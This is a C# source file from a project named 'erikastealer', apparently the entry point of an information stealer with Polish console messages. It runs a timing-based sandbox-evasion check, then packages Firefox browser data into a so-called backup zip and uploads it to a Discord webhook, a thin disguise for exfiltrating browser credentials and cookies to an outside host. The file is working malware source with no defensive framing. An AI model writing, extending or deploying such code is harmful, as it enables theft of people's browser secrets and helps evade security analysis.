using erikastealer.Exporters;
using System;
using System.Runtime.InteropServices;
using System.Threading;

namespace erikastealer
{

    public class Program
    {
        [DllImport("kernel32.dll")]
        public static extern void Sleep(uint dwMilliseconds);

        public static void amireal()
        {
            DateTime t1 = DateTime.Now;
            Thread.Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return;
            }
            else
            {
                Execute();
            }
        }

        public static void Execute()
        {
            Console.WriteLine("Wybierz przeglądarkę do backupu (Firefox, Chrome lub Edge):");
            //string browser = Console.ReadLine()?.ToLower();
            string browser = "firefox";
            try
            {
                IExporter exporter = BrowserDataExporter.GetExporter(browser);

                // Stworzenie backupu
                string backupFile = exporter.CreateBackup();
                Console.WriteLine($"Backup utworzony: {backupFile}");

                // 3️Wysyłka pliku ZIP na Discorda
                string DiscordHook = "REMOVED";
                IFileSender fileSender = new DiscordWebhookSender(DiscordHook);
                fileSender.SendFileAsync(backupFile).Wait();
                Console.WriteLine("Dane wysłane na Discorda.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Błąd to: {ex.Message}");
            }
        }

        public static void Main()
        {
            amireal();

        }
    }
 
}
